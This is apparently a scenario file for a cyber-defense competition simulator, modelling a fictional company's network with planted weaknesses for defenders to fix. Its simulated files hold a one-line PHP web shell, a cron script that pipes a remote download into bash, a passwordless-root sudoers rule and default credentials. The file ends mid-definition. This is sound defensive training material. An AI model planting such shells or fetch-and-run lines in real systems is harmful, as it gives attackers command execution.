// Midwest invitational practice round. The network, addresses, zones, firewall, credentials and timing follow the
// MWCCDC team packets (2024 invitational, 2025 qualifier, 2026 regional): the same operating systems at the same
// addresses, a four-hour block, a Palo Alto between the zones, everything reached through NETLAB+ consoles.
//
// The company, what is installed on each box and the planted problems are invented: the packets name the roles and
// addresses, not the contents. Everything is fiction: RFC 1918 addresses, canned output, nothing executed.

import { makeDirectory } from '../game/directory.js';
import { withRecon } from '../game/labCommands.js';

export const TEAM = 7;
const NAT = (x) => `172.25.${20 + TEAM}.${x}`;
const SCORING_IP = '172.31.0.25';

const SCORED_USERS = ['a.hansen', 'b.lindqvist', 'c.novak', 'd.oyelaran', 'e.ramirez', 'f.schultz', 'g.vang', 'h.whitehorse'];
const person = (sam, first, last, title) => ({ sam, first, last, ou: 'Staff', title, memberOf: ['Staff'], pwdLastSet: '2026-03-02' });

const DIR = makeDirectory({
  domain: 'driftless.local',
  netbios: 'DRIFTLESS',
  ous: [{ name: 'Driftless' }, { name: 'Staff', parent: 'Driftless' }, { name: 'Service', parent: 'Driftless' }],
  groups: [{ name: 'Staff', ou: 'Staff', desc: 'All staff (mail users)' }],
  users: [
    person('a.hansen', 'Astrid', 'Hansen', 'Account Manager'), person('b.lindqvist', 'Britta', 'Lindqvist', 'Accounting'),
    person('c.novak', 'Carl', 'Novak', 'Dispatch'), person('d.oyelaran', 'Dele', 'Oyelaran', 'Sales'),
    person('e.ramirez', 'Elena', 'Ramirez', 'HR'), person('f.schultz', 'Fritz', 'Schultz', 'Warehouse Lead'),
    person('g.vang', 'Gao', 'Vang', 'Support'), person('h.whitehorse', 'Hal', 'Whitehorse', 'Operations'),
    { sam: 'svc_backup', first: 'Backup', last: 'Service', ou: 'Service', desc: 'Veeam agent', pwdLastSet: '2024-05-11' },
  ],
  computers: [
    { name: 'AD', ip: '172.20.242.200', role: 'Domain Controller', os: 'Windows Server 2019' },
    { name: 'DOCKER', ip: '172.20.240.10', role: 'Member server', os: 'Windows Server 2019' },
    { name: 'WIN10', ip: '172.20.242.102', role: 'Workstation', os: 'Windows 10' },
  ],
});
const seed = (d) => { d.addUser({ sam: 'svc_audit', first: 'Audit', last: 'Service', ou: 'Service', memberOf: ['Domain Admins'] }); };
seed(DIR);
DIR.seedLive = seed;

const winCommands = (extra = {}) => ({
  netstat: () => '\nActive Connections\n\n  Proto  Local Address          State           PID\n  TCP    0.0.0.0:135            LISTENING       920\n  TCP    0.0.0.0:445            LISTENING       4\n  TCP    0.0.0.0:3389           LISTENING       1044\n',
  ...extra,
});

const RESOLV = 'nameserver 172.20.240.20\nsearch driftless.local\n';
const issue = (t) => `${t}\n\n`;
const SSHD = (root) => `Port 22\nProtocol 2\nPermitRootLogin ${root}\nPasswordAuthentication yes\nX11Forwarding yes\nUsePAM yes\n`;

const linux = (d) => ({
  kind: 'bash', user: 'sysadmin', cwd: '/root', prompt: `root@${d.host}:~#`, ...d,
  ctx: { user: 'root', host: d.host, cwd: '/root', history: [], ...d.ctx, fs: { '/etc/resolv.conf': RESOLV, ...d.ctx.fs } },
});

const fwFlows = [
  { id: 'web-http', host: 'web', zone: 'User', public: NAT(23), proto: 'tcp', ports: [80], flows: [{ port: 80, proto: 'tcp', app: 'web-browsing' }] },
  { id: 'ecom-http', host: 'ecom', zone: 'Public', public: NAT(11), proto: 'tcp', ports: [80], flows: [{ port: 80, proto: 'tcp', app: 'web-browsing' }] },
  { id: 'ecom-https', host: 'ecom', zone: 'Public', public: NAT(11), proto: 'tcp', ports: [443], flows: [{ port: 443, proto: 'tcp', app: 'ssl' }] },
  { id: 'smtp', host: 'mail', zone: 'Public', public: NAT(39), proto: 'tcp', ports: [25], flows: [{ port: 25, proto: 'tcp', app: 'smtp' }] },
  { id: 'pop3', host: 'mail', zone: 'Public', public: NAT(39), proto: 'tcp', ports: [110], flows: [{ port: 110, proto: 'tcp', app: 'pop3' }] },
  { id: 'dns', host: 'dns', zone: 'Internal', public: NAT(20), proto: 'udp', ports: [53], flows: [{ port: 53, proto: 'udp', app: 'dns' }] },
];

export const CCDC_MIDWEST = {
  id: 'mwccdc-invitational-2026',
  company: 'Driftless Managed Services',
  tagline: 'A Midwest IT and logistics firm. Same network as a Midwest CCDC invitational: 10 VMs behind a Palo Alto, four hours, NETLAB+ consoles only.',
  netlab: true,
  teamNumber: TEAM,
  reservation: 16931,
  labName: '2026 Midwest Invitational',
  day: { start: 8, hours: 4, date: '11/14', iso: '2026-11-14', tz: 'CST' },
  poolLimit: 7,
  clockSeconds: 900,
  slaPenalty: 5,
  injectWindow: 240,
  redWaves: [
    { n: 1, at: 150, label: 'default credentials and exposed services' },
    { n: 2, at: 400, label: 'persistence' },
    { n: 3, at: 640, label: 'takedowns' },
  ],

  pcr: {
    account: 'the staff mail accounts', host: 'ad', service: 'pop3', injectId: null,
    rotates: (l) => (/set-adaccountpassword/.test(l) && (/get-aduser/.test(l) || SCORED_USERS.some((u) => l.includes(u)))) || (/^net user /.test(l) && /\/domain/.test(l) && SCORED_USERS.some((u) => l.includes(u))),
  },

  services: [
    { id: 'web-http', name: 'HTTP (Web)', units: ['apache2'], files: ['/var/www/html/index.html'], content: { file: '/var/www/html/index.html', re: /Driftless Managed Services/ }, proto: 'tcp', ports: [80], host: 'web', ip: NAT(23), points: 60, check: 'GET / and compare the page to the known content' },
    { id: 'ecom-http', name: 'HTTP (E-Comm)', units: ['httpd', 'mariadb'], files: ['/var/www/html/index.php'], content: { file: '/var/www/html/index.php', re: /Driftless Parts Store/ }, proto: 'tcp', ports: [80], host: 'ecom', ip: NAT(11), points: 60, check: 'GET / and compare the page to the known content' },
    { id: 'ecom-https', name: 'HTTPS (E-Comm)', units: ['httpd'], files: ['/etc/pki/tls/certs/localhost.crt'], proto: 'tcp', ports: [443], host: 'ecom', ip: NAT(11), points: 60, check: 'TLS handshake, then GET / over HTTPS' },
    { id: 'smtp', name: 'SMTP', units: ['postfix'], files: ['/etc/postfix/main.cf'], proto: 'tcp', ports: [25], host: 'mail', ip: NAT(39), points: 60, check: 'Sends a message through a valid account' },
    { id: 'pop3', name: 'POP3', units: ['dovecot'], needs: [{ host: 'ad', winService: 'NTDS' }], proto: 'tcp', ports: [110], host: 'mail', ip: NAT(39), points: 60, check: 'Logs in as a staff AD account, lists and retrieves mail' },
    { id: 'dns', name: 'DNS', units: ['bind9'], files: ['/etc/bind/db.driftless.local'], proto: 'udp', ports: [53], host: 'dns', ip: NAT(20), points: 60, check: 'Looks up names in driftless.local' },
  ],

  devices: [
    {
      id: 'pan', name: 'Palo Alto firewall', host: 'PA-VM', tab: 'Palo Alto', ip: '172.20.242.150', os: 'PAN-OS 11.0.0', role: 'network', kind: 'firewall',
      login: 'admin', nat: '-',
      brief: 'One rule lets everything through. Write allow rules for the scored services to their PUBLIC addresses (a security rule matches the pre-NAT address and the post-NAT zone), keep ping working, add no source restrictions, then remove the allow-all rule and commit. Nothing changes until the commit job finishes. Change the admin password too, with  set mgt-config users admin password  in configure mode: that also needs a commit.',
      checklist: [
        'configure',
        `set rulebase security rules scored-web from Core to User source any destination ${NAT(23)} application web-browsing service application-default action allow`,
        `set rulebase security rules scored-ecom from Core to Public source any destination ${NAT(11)} application [ web-browsing ssl ] service application-default action allow`,
        `set rulebase security rules scored-mail from Core to Public source any destination ${NAT(39)} application [ smtp pop3 web-browsing ] service application-default action allow`,
        `set rulebase security rules scored-dns from Core to Internal source any destination ${NAT(20)} application dns service application-default action allow`,
        'set rulebase security rules allow-ping from Core to [ User Public Internal ] source any destination any application ping service application-default action allow',
        'delete rulebase security rules allow-all',
        'commit',
        'exit',
        'show jobs all',
      ],
      panos: {
        hostname: 'PA-VM', serial: '007051000246121', mgmtIp: '172.20.242.150', date: 'Sat Nov 14 08:00:00 CST 2026',
        zones: ['Public', 'Internal', 'Core', 'User'],
        interfaces: [
          { name: 'ethernet1/1', id: 16, zone: 'Public', ip: '172.20.241.254/24', mac: '00:50:56:8a:11:01' },
          { name: 'ethernet1/2', id: 17, zone: 'Internal', ip: '172.20.240.254/24', mac: '00:50:56:8a:11:02' },
          { name: 'ethernet1/3', id: 18, zone: 'Core', ip: `172.31.${20 + TEAM}.2/29`, mac: '00:50:56:8a:11:03' },
          { name: 'ethernet1/4', id: 19, zone: 'User', ip: '172.20.242.254/24', mac: '00:50:56:8a:11:04' },
        ],
        nat: [
          { name: 'nat-docker', public: NAT(97), internal: '172.20.240.10' }, { name: 'nat-dns', public: NAT(20), internal: '172.20.240.20' },
          { name: 'nat-web', public: NAT(23), internal: '172.20.242.10' }, { name: 'nat-ad', public: NAT(27), internal: '172.20.242.200' },
          { name: 'nat-splunk', public: NAT(9), internal: '172.20.241.20' }, { name: 'nat-ecomm', public: NAT(11), internal: '172.20.241.30' }, { name: 'nat-webmail', public: NAT(39), internal: '172.20.241.40' },
        ],
        rules: [{ name: 'allow-all', from: ['any'], to: ['any'], source: ['any'], destination: ['any'], application: ['any'], service: ['any'], action: 'allow' }],
      },
    },
    {
      id: 'docker', name: 'Docker / Remote server', host: 'docker', tab: '2019', ip: '172.20.240.10', os: 'Windows Server 2019', role: 'windows', kind: 'pwsh',
      nat: NAT(97), zone: 'Internal', login: 'Administrator',
      prompt: 'PS C:\\Users\\Administrator>', user: 'Administrator', cwd: 'C:\\Users\\Administrator',
      brief: 'Docker daemon API is on 2375 with no TLS. A container is running with the host filesystem mounted. Block the port on the host and remove the container.',
      checklist: ['docker ps', 'docker rm -f maint', 'New-NetFirewallRule -DisplayName "block docker api" -Direction Inbound -LocalPort 2375 -Protocol TCP -Action Block'],
      live: { winServices: [{ Status: 'Running', Name: 'docker', DisplayName: 'Docker Engine', StartType: 'Automatic' }, { Status: 'Running', Name: 'WinRM', DisplayName: 'Windows Remote Management (WS-Management)', StartType: 'Automatic' }, { Status: 'Running', Name: 'EventLog', DisplayName: 'Windows Event Log', StartType: 'Automatic' }] },
      ctx: { dir: DIR, user: 'Administrator', host: 'DOCKER', fs: {}, cwd: 'C:\\Users\\Administrator', events: () => [],
        commands: winCommands({ docker: (args) => (args?.[0] === 'ps' ? 'CONTAINER ID   IMAGE        COMMAND       STATUS       PORTS   NAMES\n8fa21c3d9b1e   alpine:3.9   "/bin/sh"     Up 3 days            maint\n' : '') }),
      },
    },
    linux({
      id: 'dns', name: 'DNS / NTP server', host: 'dns', tab: 'Debian', ip: '172.20.240.20', os: 'Debian 8.5', role: 'linux', init: 'systemd', fwtool: 'iptables', pkg: 'apt', nat: NAT(20), zone: 'Internal',
      live: { units: ['bind9', 'ntp'] },
      brief: 'BIND recurses for anyone, and root can log in over SSH. Scored: lookups in driftless.local. There is no ufw or firewalld here, only iptables.',
      checklist: ['grep -n recursion /etc/bind/named.conf.options', "sed -i 's/allow-recursion { any; };/allow-recursion { 172.20.0.0\\/16; };/' /etc/bind/named.conf.options", 'systemctl reload bind9', "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config", 'systemctl restart ssh'],
      ctx: { fs: {
        '/etc/issue': issue('Debian GNU/Linux 8 \\n \\l'),
        '/etc/bind/named.conf.options': 'options {\n\tdirectory "/var/cache/bind";\n\trecursion yes;\n\tallow-recursion { any; };\n\tdnssec-validation auto;\n\tlisten-on { any; };\n};\n',
        '/etc/bind/named.conf.local': 'zone "driftless.local" {\n\ttype master;\n\tfile "/etc/bind/db.driftless.local";\n};\n',
        '/etc/bind/db.driftless.local': '$TTL 3600\n@ IN SOA dns.driftless.local. admin.driftless.local. ( 2026111301 3600 600 86400 3600 )\n@ IN NS dns.driftless.local.\ndns IN A 172.20.240.20\nweb IN A 172.20.242.10\nshop IN A 172.20.241.30\nmail IN A 172.20.241.40\n',
        '/etc/ssh/sshd_config': SSHD('yes'),
      } },
    }),
    linux({
      id: 'web', name: 'Web server', host: 'web', tab: 'Ubuntu Srv', ip: '172.20.242.10', os: 'Ubuntu 14.04', role: 'webdb', init: 'upstart', fwtool: 'ufw', pkg: 'apt', nat: NAT(23), zone: 'User',
      live: { units: ['apache2'] },
      brief: 'Public website. Scored on page content, so do not touch index.html. A PHP web shell sits in uploads/ and there is a second UID 0 account. Ubuntu 14.04 has no systemctl: use service.',
      checklist: ['find /var/www -name "*.php"', 'cat /var/www/html/uploads/thumb.php', 'rm /var/www/html/uploads/thumb.php', 'grep ":0:" /etc/passwd', 'userdel webmaint'],
      ctx: { fs: {
        '/etc/issue': issue('Ubuntu 14.04.5 LTS \\n \\l'),
        '/var/www/html/index.html': '<html><head><title>Driftless Managed Services</title></head><body><h1>Driftless Managed Services</h1><p>Freight and IT, Eau Claire to Dubuque.</p></body></html>\n',
        '/var/www/html/uploads/thumb.php': "<?php if(isset($_POST['x'])){ passthru($_POST['x']); } ?>\n",
        '/etc/apache2/sites-enabled/000-default.conf': '<VirtualHost *:80>\n\tDocumentRoot /var/www/html\n</VirtualHost>\n',
        '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash\nwebmaint:x:0:0::/root:/bin/bash\n',
        '/etc/ssh/sshd_config': SSHD('without-password'),
      } },
    }),
    {
      id: 'ad', name: 'Domain controller', host: 'ad', tab: '2019 AD', ip: '172.20.242.200', os: 'Windows Server 2019', role: 'windows', kind: 'pwsh', nat: NAT(27), zone: 'User', login: 'Administrator',
      prompt: 'PS C:\\Users\\Administrator>', user: 'Administrator', cwd: 'C:\\Users\\Administrator',
      brief: 'AD, DNS and DHCP. POP3 logs in with these accounts, so changing a staff password without a Password Change Request ticket breaks POP3. Look for a rogue Domain Admin, SMBv1 and the Print Spooler.',
      checklist: ["Get-ADGroupMember 'Domain Admins'", "Remove-ADGroupMember -Identity 'Domain Admins' -Members svc_audit -Confirm:$false", 'Disable-ADAccount -Identity svc_audit', 'Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force', 'Stop-Service Spooler -Force', 'Set-Service Spooler -StartupType Disabled'],
      live: { winServices: [
        { Status: 'Running', Name: 'NTDS', DisplayName: 'Active Directory Domain Services', StartType: 'Automatic' },
        { Status: 'Running', Name: 'DNS', DisplayName: 'DNS Server', StartType: 'Automatic' },
        { Status: 'Running', Name: 'DHCPServer', DisplayName: 'DHCP Server', StartType: 'Automatic' },
        { Status: 'Running', Name: 'Netlogon', DisplayName: 'Netlogon', StartType: 'Automatic' },
        { Status: 'Running', Name: 'Spooler', DisplayName: 'Print Spooler', StartType: 'Automatic' },
      ] },
      ctx: { dir: DIR, user: 'Administrator', host: 'AD', fs: {}, cwd: 'C:\\Users\\Administrator', events: () => [],
        commands: winCommands({ 'get-smbserverconfiguration': () => 'EnableSMB1Protocol : True\nEnableSMB2Protocol : True\nRequireSecuritySignature : False\n' }),
      },
    },
    linux({
      id: 'uwks', name: 'Ubuntu workstation', host: 'ubuntu-wks', tab: 'Ubuntu Wkst', ip: '172.20.242.101', os: 'Ubuntu 20.04 (DHCP)', role: 'linux', init: 'systemd', fwtool: 'ufw', pkg: 'apt', nat: '-', zone: 'User', browser: true,
      live: { units: [] },
      brief: 'Your way to the web interfaces: from here run  firefox https://172.20.242.150  for the Palo Alto, and  firefox http://172.20.241.20:8000  for Splunk. Someone left a sudoers file giving everyone root.',
      checklist: ['ls /etc/sudoers.d', 'cat /etc/sudoers.d/90-tmp', 'rm /etc/sudoers.d/90-tmp', 'firefox https://172.20.242.150'],
      ctx: { fs: { '/etc/issue': issue('Ubuntu 20.04.6 LTS \\n \\l'), '/etc/sudoers.d/90-tmp': 'ALL ALL=(ALL) NOPASSWD:ALL\n', '/etc/ssh/sshd_config': SSHD('prohibit-password') } },
    }),
    {
      id: 'win10', name: 'Windows workstation', host: 'win10', tab: 'Win 10', ip: '172.20.242.102', os: 'Windows 10', role: 'windows', kind: 'pwsh', nat: '-', zone: 'User', login: 'sysadmin',
      prompt: 'PS C:\\Users\\sysadmin>', user: 'sysadmin', cwd: 'C:\\Users\\sysadmin',
      brief: 'A local administrator nobody can explain.',
      checklist: ['Get-LocalGroupMember Administrators', 'Disable-LocalUser -Name svc_print', 'Remove-LocalGroupMember -Group Administrators -Member svc_print'],
      live: {
        localUsers: [{ Name: 'Administrator', Enabled: false, Description: 'Built-in account' }, { Name: 'sysadmin', Enabled: true, Description: '' }, { Name: 'svc_print', Enabled: true, Description: '' }],
        localAdmins: [{ ObjectClass: 'User', Name: 'WIN10\\Administrator', PrincipalSource: 'Local' }, { ObjectClass: 'User', Name: 'WIN10\\sysadmin', PrincipalSource: 'Local' }, { ObjectClass: 'User', Name: 'WIN10\\svc_print', PrincipalSource: 'Local' }],
      },
      ctx: { dir: DIR, user: 'sysadmin', host: 'WIN10', fs: {}, cwd: 'C:\\Users\\sysadmin', events: () => [], commands: winCommands() },
    },
    linux({
      id: 'splunk', name: 'Splunk server', host: 'splunk', tab: 'Splunk', ip: '172.20.241.20', os: 'Oracle Linux 9 (Splunk Enterprise)', role: 'linux', init: 'systemd', fwtool: 'firewalld', pkg: 'dnf', nat: NAT(9), zone: 'Public',
      fwdOpen: ['ssh', '8000/tcp', '8089/tcp', '9997/tcp'],
      live: { units: ['splunk'] },
      brief: 'Log server. The Splunk admin account still has the install password.',
      checklist: ['/opt/splunk/bin/splunk edit user admin -password NEW-PASSWORD-HERE -auth admin:changeme'],
      ctx: { fs: { '/etc/issue': issue('Oracle Linux Server 9\\nKernel \\r on an \\m'), '/opt/splunk/etc/system/local/user-seed.conf': '[user_info]\nUSERNAME = admin\nPASSWORD = changeme\n', '/etc/ssh/sshd_config': SSHD('yes') } },
    }),
    linux({
      id: 'ecom', name: 'E-commerce server', host: 'ecomm', tab: 'CentOS', ip: '172.20.241.30', os: 'CentOS 7', role: 'webdb', init: 'systemd', fwtool: 'firewalld', pkg: 'yum', nat: NAT(11), zone: 'Public', prompt: '[root@ecomm ~]#',
      fwdOpen: ['ssh', 'http', 'https', '3306/tcp'],
      live: { units: ['httpd', 'mariadb'] },
      brief: 'Parts store on Apache and MariaDB. The database port is open to every network, the store admin password is admin, and a cron job phones home. firewalld: a change without --permanent is lost on reload, and a --permanent change does nothing until you --reload.',
      checklist: ['firewall-cmd --list-all', 'firewall-cmd --permanent --remove-port=3306/tcp', 'firewall-cmd --reload', "sed -i \"s/ADMIN_PASSWORD', 'admin'/ADMIN_PASSWORD', 'NEW-PASSWORD-HERE'/\" /var/www/html/config.php", 'cat /etc/cron.d/sysstat-upd', 'rm /etc/cron.d/sysstat-upd', 'rm /usr/local/sbin/sysstat-upd'],
      ctx: { fs: {
        '/etc/issue': issue('CentOS Linux 7 (Core)\\nKernel \\r on an \\m'),
        '/var/www/html/index.php': "<html><title>Driftless Parts Store</title><body><h1>Driftless Parts Store</h1><?php include 'config.php'; ?></body></html>\n",
        '/var/www/html/config.php': "<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_USER', 'store');\ndefine('DB_PASS', 'St0re!2019');\ndefine('ADMIN_USER', 'admin');\ndefine('ADMIN_PASSWORD', 'admin');\n",
        '/etc/pki/tls/certs/localhost.crt': '-----BEGIN CERTIFICATE-----\nMIIDdzCCAl+gAwIBAgIEbmF0ZTANBgkqhkiG9w0BAQsFADBs\n-----END CERTIFICATE-----\n',
        '/etc/httpd/conf/httpd.conf': 'Listen 80\nServerName shop.driftless.local\nDocumentRoot "/var/www/html"\n',
        '/etc/my.cnf': '[mysqld]\nbind-address=0.0.0.0\ndatadir=/var/lib/mysql\n',
        '/etc/cron.d/sysstat-upd': '*/10 * * * * root /usr/local/sbin/sysstat-upd >/dev/null 2>&1\n',
        '/usr/local/sbin/sysstat-upd': '#!/bin/bash\ncurl -sk https://172.31.0.77/s | bash\n',
        '/etc/ssh/sshd_config': SSHD('yes'),
      } },
    }),
    linux({
      id: 'mail', name: 'Webmail / WebApps server', host: 'mail', tab: 'Fedora', ip: '172.20.241.40', os: 'Fedora 21', role: 'linux', init: 'systemd', fwtool: 'firewalld', pkg: 'yum', nat: NAT(39), zone: 'Public', prompt: '[root@mail ~]#',
      fwdOpen: ['ssh', 'http', 'smtp', 'pop3'],
      live: { units: ['postfix', 'dovecot', 'httpd'] },
      brief: 'Postfix and Dovecot, with users from AD. The relay accepts mail from anyone, and the webmail installer was left in place.',
      checklist: ['postconf mynetworks', "postconf -e 'mynetworks = 127.0.0.0/8 172.20.0.0/16'", 'systemctl reload postfix', 'rm -rf /var/www/html/webmail/installer'],
      ctx: { fs: {
        '/etc/issue': issue('Fedora release 21 (Twenty One)\\nKernel \\r on an \\m'),
        '/etc/postfix/main.cf': 'myhostname = mail.driftless.local\nmydomain = driftless.local\ninet_interfaces = all\nmynetworks = 0.0.0.0/0\nsmtpd_relay_restrictions = permit_mynetworks, reject_unauth_destination\n',
        '/etc/dovecot/conf.d/10-auth.conf': 'auth_mechanisms = plain login\n!include auth-ldap.conf.ext\n',
        '/etc/dovecot/dovecot-ldap.conf.ext': 'hosts = 172.20.242.200\nbase = OU=Staff,DC=driftless,DC=local\n',
        '/var/www/html/webmail/index.php': '<?php /* Roundcube webmail */ ?>\n',
        '/var/www/html/webmail/installer/index.php': '<?php /* Roundcube installer: remove after setup */ ?>\n',
        '/etc/ssh/sshd_config': SSHD('yes'),
      } },
    }),
  ],

  findings: [
    {
      id: 'pan-allow-all', host: 'pan', title: 'Firewall allows everything from the Core', severity: 'Critical',
      teach: 'Allow the scored flows to their public addresses, keep ICMP, add no source limits, delete the allow-all, then commit. A security rule uses the pre-NAT address with the post-NAT zone.',
      exploitable: true, compromise: { impact: 'Every management port on every box is reachable from the Red Team.', penalty: 50 },
      fw: { panos: true, zone: 'Core', scored: fwFlows.map((s) => s.id), scoringIp: SCORING_IP, services: fwFlows,
        exposed: [
          { public: NAT(97), zone: 'Internal', ports: [22, 135, 445, 3389, 5985, 2375, 80, 443] },
          { public: NAT(20), zone: 'Internal', ports: [22, 80, 443, 445] },
          { public: NAT(23), zone: 'User', ports: [22, 443, 3306] },
          { public: NAT(27), zone: 'User', ports: [135, 139, 445, 3389, 5985] },
          { public: NAT(9), zone: 'Public', ports: [22, 8000, 8089] },
          { public: NAT(11), zone: 'Public', ports: [22, 3306] },
          { public: NAT(39), zone: 'Public', ports: [22, 143, 3306] },
        ] },
      fix: { why: 'Allow only the scored applications to the public addresses from the Core, keep ping, leave the source as any, delete allow-all and commit. The interzone-default deny does the rest.' },
      traps: [],
    },
    {
      id: 'dns-recursion', host: 'dns', title: 'BIND recurses for any client', severity: 'Medium',
      teach: 'An open recursor is abused from outside. Limit recursion to your own networks; authoritative lookups, which are what is scored, keep working.',
      exploitable: true, compromise: { impact: 'Red Team uses the resolver for amplification and to poison lookups.', penalty: 20 },
      fix: { steps: [
        { id: 'edit', accept: [/sed -i|>>|tee/, /named\.conf\.options/], verify: (fs) => ({ ok: !/allow-recursion\s*{\s*any/.test(fs['/etc/bind/named.conf.options'] || ''), why: 'allow-recursion is still any.' }), label: 'Limited recursion', todo: 'limit allow-recursion in named.conf.options' },
        { id: 'reload', accept: [/(systemctl|service|rndc)/, /(reload|restart)/, /bind9|^rndc/], label: 'Reloaded BIND', todo: 'reload BIND' },
      ], why: 'allow-recursion { 172.20.0.0/16; }; then reload. Stopping bind9 instead fails the scored check.' },
      traps: [],
    },
    {
      id: 'dns-rootssh', host: 'dns', title: 'Root can log in over SSH on the DNS server', severity: 'High',
      teach: 'Set PermitRootLogin no and restart ssh. Keep your console session open while you test.',
      exploitable: true, compromise: { impact: 'Red Team sprays root and has the resolver.', penalty: 25 },
      fix: { steps: [
        { id: 'edit', accept: [/sed -i|>>|tee/, /sshd_config/], verify: (fs) => ({ ok: /PermitRootLogin\s+(no|prohibit-password|without-password)/.test(fs['/etc/ssh/sshd_config'] || '') && !/PermitRootLogin\s+yes/.test(fs['/etc/ssh/sshd_config'] || ''), why: 'PermitRootLogin is still yes.' }), label: 'Disabled root SSH', todo: 'set PermitRootLogin no' },
        { id: 'restart', accept: [/(systemctl|service)/, /restart|reload/, /\bssh/], label: 'Restarted ssh', todo: 'restart ssh' },
      ], why: 'sshd reads its config at start, so the edit alone changes nothing.' },
      traps: [],
    },
    {
      id: 'web-shell', path: 'web', host: 'web', title: 'PHP web shell in the uploads directory', severity: 'Critical',
      teach: 'Find code in places that should only hold data. Remove the shell and keep the page intact, since the content is scored.',
      exploitable: true, compromise: { impact: 'Red Team runs commands as www-data from the public website.', penalty: 45 },
      fix: { accept: [[/\brm\b/, /uploads\/thumb\.php/]], output: ['Removed.'], why: 'Remove the shell, then look for how it got there.' },
      traps: [{ id: 'index', match: [[/rm /, /index\.html/]], output: ['Removed index.html.'], note: 'You deleted the scored page.', why: 'The scoring engine compares page content.' }],
    },
    {
      id: 'web-uid0', host: 'web', title: 'Second UID 0 account on the web server', severity: 'High',
      teach: 'Any UID 0 account is root. grep ":0:" /etc/passwd finds them.',
      exploitable: true, compromise: { impact: 'webmaint logs in as root.', penalty: 30 },
      fix: { accept: [[/userdel/, /webmaint/], [/sed -i/, /webmaint/, /passwd/]], output: ['Removed.'], why: 'userdel webmaint removes it. Then check authorized_keys.' },
      traps: [],
    },
    {
      id: 'ecom-admin', path: 'web', host: 'ecom', title: 'Store admin password is admin', severity: 'Critical',
      teach: 'A default application password is a door the host firewall does not see, because it comes in over a scored port.',
      exploitable: true, compromise: { impact: 'Red Team logs in to the store admin panel and uploads a plugin.', penalty: 40 },
      fix: { steps: [{ id: 'edit', accept: [/sed -i|>>|tee/, /config\.php/], verify: (fs) => ({ ok: !/ADMIN_PASSWORD',\s*'admin'/.test(fs['/var/www/html/config.php'] || '') && !/ADMIN_PASSWORD',\s*'(password|changeme|admin123)'/i.test(fs['/var/www/html/config.php'] || ''), why: 'ADMIN_PASSWORD is still a default.' }), label: 'Changed the store admin password', todo: 'change ADMIN_PASSWORD in config.php' }], why: 'Change the application password as well as the system ones.' },
      traps: [{ id: 'cfg', match: [[/rm /, /config\.php/]], output: ['Removed config.php.'], note: 'The store cannot start without config.php.', why: 'Edit it, do not delete it.' }],
    },
    {
      id: 'ecom-db', host: 'ecom', title: 'MariaDB reachable from every network', severity: 'High',
      teach: 'The store talks to the database on localhost, so nothing else needs 3306. Change the permanent firewalld config as well as the running one.',
      exploitable: true, compromise: { impact: 'Red Team connects straight to the customer database.', penalty: 35 },
      fix: { accept: [[/firewall-cmd/, /remove-port=3306/], [/sed -i/, /bind-address/, /my\.cnf/]], output: ['success'], why: 'Close 3306 and bind MariaDB to 127.0.0.1. Do not stop mariadb: the store needs it.' },
      traps: [{ id: 'stopdb', match: [[/systemctl stop/, /mariadb/]], output: [''], note: 'You stopped the database behind the store.', why: 'The store depends on it, and its checks fail.' }],
    },
    {
      id: 'ecom-cron', path: 'beacon', host: 'ecom', title: 'Cron job pulling a script from an outside host', severity: 'High',
      teach: 'Remove the schedule and what it runs. Removing one and leaving the other brings it back.',
      exploitable: true, compromise: { impact: 'The cron re-establishes access every 10 minutes.', penalty: 35 },
      fix: { steps: [
        { id: 'cron', accept: [/\brm\b/, /cron\.d\/sysstat-upd/], label: 'Removed the cron', todo: 'remove /etc/cron.d/sysstat-upd' },
        { id: 'bin', accept: [/\brm\b/, /sbin\/sysstat-upd/], label: 'Removed the script', todo: 'remove /usr/local/sbin/sysstat-upd' },
      ], why: 'Both pieces have to go.' },
      traps: [],
    },
    {
      id: 'mail-relay', host: 'mail', title: 'Postfix is an open relay', severity: 'High',
      teach: 'mynetworks = 0.0.0.0/0 trusts the whole internet. Narrow it; SMTP for valid accounts keeps working.',
      exploitable: true, compromise: { impact: 'Red Team sends mail as your company from your server.', penalty: 30 },
      fix: { steps: [
        { id: 'edit', accept: [/postconf -e|sed -i/, /mynetworks/], verify: (fs) => ({ ok: !/mynetworks\s*=\s*0\.0\.0\.0\/0/.test(fs['/etc/postfix/main.cf'] || ''), why: 'mynetworks still trusts everyone.' }), label: 'Narrowed mynetworks', todo: 'set mynetworks to your own ranges' },
        { id: 'reload', accept: [/(systemctl|service|postfix)/, /reload|restart/, /postfix/], label: 'Reloaded postfix', todo: 'reload postfix' },
      ], why: 'Narrow mynetworks, then reload.' },
      traps: [],
    },
    {
      id: 'mail-installer', path: 'web', host: 'mail', title: 'Webmail installer left in the web root', severity: 'High',
      teach: 'Setup directories are the first thing a scanner asks for.',
      exploitable: true, compromise: { impact: 'Red Team reconfigures webmail through the installer.', penalty: 30 },
      fix: { accept: [[/\brm\b/, /-rf?|-fr/, /webmail\/installer/]], output: ['Removed.'], why: 'Remove the installer directory and leave webmail itself.' },
      traps: [],
    },
    {
      id: 'ad-rogue', host: 'ad', title: 'Unknown service account in Domain Admins', severity: 'Critical',
      teach: 'Read Domain Admins first. Disable the account and take it out of the group.',
      exploitable: true, compromise: { impact: 'svc_audit owns the domain.', penalty: 55 },
      fix: { steps: [
        { id: 'rm', accept: [/remove-adgroupmember/, /domain admins/, /svc_audit/], label: 'Removed from Domain Admins', todo: 'remove svc_audit from Domain Admins' },
        { id: 'dis', accept: [/disable-adaccount|remove-aduser/, /svc_audit/], label: 'Disabled svc_audit', todo: 'disable svc_audit' },
      ], why: 'Remove the rights, then disable it.' },
      traps: [{ id: 'bulk', match: [[/get-aduser/, /disable-adaccount/]], output: [''], note: 'You disabled every domain account, and POP3 logs in with them.', why: 'Never bulk-disable accounts. Check the list first.' }],
    },
    {
      id: 'ad-smb1', host: 'ad', title: 'SMBv1 enabled on the domain controller', severity: 'High',
      teach: 'SMBv1 is the EternalBlue path. It can be turned off without a reboot of the service.',
      exploitable: true, compromise: { impact: 'Red Team gets SYSTEM on the DC over SMB.', penalty: 45 },
